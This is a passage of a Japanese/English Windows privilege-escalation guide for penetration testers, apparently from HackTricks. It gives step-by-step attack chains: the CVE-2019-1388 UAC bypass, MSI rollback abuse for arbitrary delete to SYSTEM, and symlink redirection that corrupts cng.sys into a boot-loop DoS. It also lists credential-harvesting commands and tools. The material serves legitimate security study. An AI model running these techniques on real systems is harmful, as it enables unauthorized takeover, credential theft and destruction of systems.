ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータをクリアテキストで保存するいくつかのツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP）の**sessions**, **usernames** および **passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

次のような状況を想定してください：**a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**。同じプロセスが**also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**。\
その場合、**full access to the low privileged process**を持っていれば、`OpenProcess()`で作成された**open handle to the privileged process created**を取得して**inject a shellcode**できます。\
[この例を参照すると、**how to detect and exploit this vulnerability**についてさらに詳しく知ることができます。](leaked-handle-exploitation.md)\
[より完全な説明（プロセスやスレッドの継承ハンドルを異なる権限レベルでテスト・悪用する方法について — full access に限らない）についてはこの**other post**を参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

共有メモリセグメント、**pipes**と呼ばれるものは、プロセス間の通信とデータ転送を可能にします。

Windowsは**Named Pipes**という機能を提供しており、関連のないプロセス間でも、場合によっては異なるネットワークを跨いでデータを共有できます。これはクライアント/サーバーのアーキテクチャに似ており、役割は**named pipe server**と**named pipe client**として定義されます。

クライアントがパイプを通してデータを送信すると、そのパイプを作成した**server**は必要な**SeImpersonate**権限があれば**client**のアイデンティティを引き受けることができます。パイプ経由で通信する**privileged process**を特定してそれを模倣できれば、あなたが作成したパイプとやり取りした時点でそのプロセスのアイデンティティを採用し、**gain higher privileges**する機会が得られます。こうした攻撃の実行手順については[**here**](named-pipe-client-impersonation.md)および[**here**](#from-high-integrity-to-system)を参照してください。

また、次のツールはburpのようなツールでnamed pipeの通信を**intercept**することを可能にします： [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **および、システム上のすべてのパイプを一覧表示してprivescの候補を探すのに役立つツール：** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windowsで実行される可能性のあるファイル拡張子

ページ **[https://filesec.io/](https://filesec.io/)** を確認してください。

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **コマンドライン内のパスワードを監視する**

ユーザーとしてシェルを取得した場合、スケジュールされたタスクや他のプロセスが**コマンドライン上で資格情報を渡す**ことがあります。以下のスクリプトはプロセスのコマンドラインを2秒ごとに取得し、現在の状態を前回と比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを窃取する

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェイス（console または RDP 経由）にアクセスでき、UAC が有効になっている場合、一部の Microsoft Windows バージョンでは、権限の低いユーザーから terminal や "NT\AUTHORITY SYSTEM" のような他のプロセスを実行することが可能です。

これにより、同じ脆弱性で権限昇格と UAC のバイパスが同時に可能になります。さらに、何もインストールする必要はなく、プロセス中に使用される binary は Microsoft によって署名・発行されています。

影響を受けるシステムの一部は以下の通りです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
あなたは以下のGitHubリポジトリに必要なファイルと情報をすべて持っています:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Integrity Levelsについて学ぶには、これを読んでください：


{{#ref}}
integrity-levels.md
{{#endref}}

次に、UACとUAC bypassesについて学ぶには、これを読んでください：


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

この技術は、このブログ投稿で説明されています [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) かつエクスプロイトコードはここで入手できます [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

攻撃は基本的に Windows Installer の rollback 機能を悪用し、アンインストール中に正当なファイルを悪意あるファイルに置き換えるものです。これには、攻撃者が `C:\Config.Msi` フォルダを乗っ取るための **malicious MSI installer** を作成する必要があります。Windows Installer は後に他の MSI パッケージのアンインストール時に rollback ファイルを保存するためにこのフォルダを使用し、rollback ファイルが悪意あるペイロードを含むように改変されます。

手法の要約は以下の通りです：

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- 書き込み可能なフォルダ（`TARGETDIR`）に無害なファイル（例：`dummy.txt`）をインストールする `.msi` を作成します。
- インストーラを **"UAC Compliant"** とマークし、**非管理者ユーザー**でも実行できるようにします。
- インストール後にファイルへの **handle** を開いたままにします。

- Step 2: Begin Uninstall
- 同じ `.msi` をアンインストールします。
- アンインストール処理はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイルにリネームして rollback バックアップを作成し始めます。
- ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出するために、`GetFinalPathNameByHandle` を使用して**開いているファイルハンドルをポーリング**します。

- Step 3: Custom Syncing
- `.msi` には以下を行う **カスタムアンインストールアクション（`SyncOnRbfWritten`）** が含まれます：
- `.rbf` が書き込まれたことをシグナルします。
- その後、アンインストールを続行する前に別のイベントを待機します。

- Step 4: Block Deletion of `.rbf`
- シグナルを受け取ったら、`FILE_SHARE_DELETE` なしで `.rbf` ファイルを **オープン** します — これによりそのファイルの **削除が防止されます**。
- その後、アンインストールが完了できるようにシグナルを返します。
- Windows Installer は `.rbf` を削除できず、フォルダ内の全てを削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: Manually Delete `.rbf`
- 攻撃者は `.rbf` ファイルを手動で削除します。
- これで **`C:\Config.Msi` は空** になり、ハイジャックの準備が整います。

> この時点で、`C:\Config.Msi` を削除するために **SYSTEM レベルの arbitrary folder delete 脆弱性** をトリガーしてください。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 自分で `C:\Config.Msi` フォルダを再作成します。
- **弱い DACL**（例：Everyone:F）を設定し、`WRITE_DAC` を持つハンドルを**開いたままに**します。

- Step 7: Run Another Install
- 再度 `.msi` をインストールします。設定は次の通り：
- `TARGETDIR`: 書き込み可能な場所。
- `ERROROUT`: 強制的な失敗を引き起こす変数。
- このインストールは再び **rollback** を誘発するために使用され、`.rbs` と `.rbf` を読み込みます。

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が出現するまで待ちます。
- そのファイル名を取得します。

- Step 9: Sync Before Rollback
- `.msi` には以下を行う **カスタムインストールアクション（`SyncBeforeRollback`）** が含まれます：
- `.rbs` が作成されたときにイベントをシグナルします。
- その後、続行する前に待機します。

- Step 10: Reapply Weak ACL
- `.rbs created` イベントを受け取った後：
- Windows Installer は `C:\Config.Msi` に **強い ACL を再適用** します。
- しかし、あなたが `WRITE_DAC` を持つハンドルをまだ開いているため、再度 **弱い ACL を再適用** できます。

> ACL は **ハンドルがオープンされた時のみ強制される** ので、フォルダへの書き込みはまだ可能です。

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` ファイルを **偽の rollback スクリプト** で上書きし、Windows に次の操作を行わせます：
- あなたの `.rbf`（悪意ある DLL）を **特権のある場所**（例：`C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元するよう指示。
- SYSTEM レベルのペイロード DLL を含む偽の `.rbf` をドロップします。

- Step 12: Trigger the Rollback
- 同期イベントをシグナルしてインストーラの実行を再開させます。
- 既知のポイントでインストールを意図的に失敗させるように設定された **type 19 カスタムアクション（`ErrorOut`）** によって、**rollback が開始** されます。

- Step 13: SYSTEM Installs Your DLL
- Windows Installer はあなたの悪意ある `.rbs` を読み、
- ターゲット場所にあなたの `.rbf` DLL をコピーします。
- これで **SYSTEM がロードするパスに悪意ある DLL が設置** されます。

- Final Step: Execute SYSTEM Code
- DLL をロードする **auto-elevated な信頼済みバイナリ**（例：`osk.exe`）を実行します。
- **完了**：あなたのコードが **SYSTEM として実行** されます。


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

主要な MSI rollback 手法（前述のもの）は、`C:\Config.Msi` のような **フォルダ全体を削除できる** ことを前提としています。しかし、もしあなたの脆弱性が **任意のファイル削除のみ** を許す場合はどうでしょうか？

NTFS の内部を悪用できます：すべてのフォルダには隠しの代替データストリームが存在します。
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION` ストリームを削除すると**、NTFS はファイルシステムからフォルダ全体を**削除します**。

これは標準のファイル削除APIを使用して行えます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼んでいるにもかかわらず、**フォルダ自体を削除する**。

### Folder Contents Delete から SYSTEM EoP へ
もしあなたの primitive が任意のファイル/フォルダを削除できないが、**攻撃者が制御するフォルダの *contents* を削除できる** としたらどうする？

1. Step 1: ベイト用フォルダとファイルをセットアップ
- 作成: `C:\temp\folder1`
- その中: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設置
- **oplock** は、特権プロセスが `file1.txt` を削除しようとしたときに **実行を一時停止** させる。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ3: SYSTEMプロセスをトリガー（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock triggers** が発生し、コントロールがあなたのコールバックに渡されます。

4. ステップ4: oplock callback の内部 – 削除をリダイレクト

- オプションA: `file1.txt` を別の場所へ移動
- これにより `folder1` を空にできますが、oplock は壊れません。
- `file1.txt` を直接削除しないでください — それを行うと oplock が早期に解放されます。

- オプションB: `folder1` を **junction** に変換：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納するNTFSの内部ストリームを標的にしており — それを削除するとフォルダが削除されます。

5. ステップ5: oplockを解放
- SYSTEM プロセスは続行し、`file1.txt` を削除しようとします。
- しかし今、junction + symlink のため、実際に削除しているのは:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### From Arbitrary Folder Create to Permanent DoS

その primitive を悪用すると、**SYSTEM/admin として任意のフォルダを作成**できます — たとえ **ファイルを書き込めない** または **弱いパーミッションを設定できない** 場合でも。

名前を**critical Windows driver**にした**フォルダ**（ファイルではなく）を作成します。例：
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` カーネルモードドライバに対応します。
- もしそれを**フォルダとして事前に作成すると**、Windows は起動時に実際のドライバを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダを見つけると、**実際のドライバを解決できず**、**クラッシュするか起動が停止します**。
- 外部の介入（例：ブート修復やディスクアクセス）なしには、**フォールバックもなく**、**回復もできません**。

### 特権ログ/バックアップパス + OM symlinks から任意ファイル上書き / ブートDoS へ

ある**特権サービス**が**書き込み可能な設定**から読み取ったパスにログ/エクスポートを書き込む場合、そのパスを**Object Manager symlinks + NTFS mount points**でリダイレクトして、特権の書き込みを任意の上書きに変えることができます（**SeCreateSymbolicLinkPrivilege**なしでも）。

**要件**
- ターゲットパスを格納する設定ファイルが攻撃者によって書き込み可能であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` へのマウントポイントと OM ファイル symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスに書き込む特権操作（ログ、エクスポート、レポートなど）。

**例**
1. 設定を読み取り、特権ログの宛先を復元する。例：`SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` が `C:\ProgramData\ICONICS\IcoSetup64.ini` に記載されている場合。
2. 管理者権限なしでそのパスをリダイレクトする：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例: 管理者が "send test SMS" をトリガー）。書き込みは `C:\Windows\System32\cng.sys` に行われる。
4. 上書きされたターゲット（hex/PE parser）を検査して破損を確認する；再起動すると Windows は改竄されたドライバパスを読み込ませられるため → **boot loop DoS**。これは、特権サービスが書き込みのために開く任意の保護ファイルにも一般化される。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれるが、`C:\Windows\System32\cng.sys` にコピーが存在する場合は先にそちらが試される可能性があり、破損データの信頼できる DoS sink になり得る。



## **High Integrity から SYSTEM へ**

### **新しいサービス**

すでに High Integrity プロセスで実行している場合、**SYSTEM へのパス**は単に**新しいサービスを作成して実行する**だけで簡単になる：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス用バイナリを作成する際は、それが有効なサービスであるか、あるいはサービスでない場合は必要な処理を迅速に実行するようにしてください。そうでないと20秒で終了されます。

### AlwaysInstallElevated

High Integrity プロセスから、**AlwaysInstallElevated レジストリ エントリを有効にして**、_**.msi**_ ラッパーを使って reverse shell を **インストール** することを試みることができます。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく既に High Integrity プロセスで見つかることが多い）、SeDebug privilege を使ってほとんど任意のプロセス（protected processes は除く）を開き、そのプロセスの token をコピーして、その token で任意のプロセスを作成することができます。\
通常、この手法ではすべての token privileges を持つ SYSTEM として動作しているプロセスを選択します（はい、全ての token privileges を持たない SYSTEM プロセスも存在します）。\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

この手法は meterpreter が `getsystem` を行う際に使われます。手法は **パイプを作成し、その後サービスを作成／悪用してそのパイプに書き込ませる** というものです。すると、**`SeImpersonate`** privilege を使ってパイプを作成した **server** はパイプクライアント（サービス）の token を **impersonate** でき、SYSTEM 権限を取得できます。\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

SYSTEM として動作するプロセスによってロードされる dll を **ハイジャック** できれば、その権限で任意のコードを実行できます。したがって Dll Hijacking はこの種の権限昇格に有効であり、さらに high integrity process からは DLL をロードするフォルダに対する **write permissions** を持つため、より容易に達成できます。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations や機密ファイルをチェックします（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 一部の潜在的な misconfigurations をチェックし情報収集を行います（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations をチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, および RDP の保存されたセッション情報を抽出します。ローカルでは -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から認証情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメインに対してスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell 製の ADIDNS/LLMNR/mDNS スプーファーおよび man-in-the-middle ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc 用の Windows 列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc 脆弱性を検索する（Watson により非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理者権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc 脆弱性を検索します（VisualStudio でのコンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して misconfigurations を検索します（privesc というより情報収集ツール）。（コンパイルが必要）（**[precompiled](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアから認証情報を抽出します（GitHub に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# ポート**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration をチェックする（実行ファイルは GitHub に precompiled）。推奨されません。Win10 ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能性のある misconfigurations をチェックします（python からの exe）。推奨されません。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿をベースに作成されたツールです（proper に動作するのに accesschk は必要ありませんが、使用することはできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（ローカル python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（ローカル python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
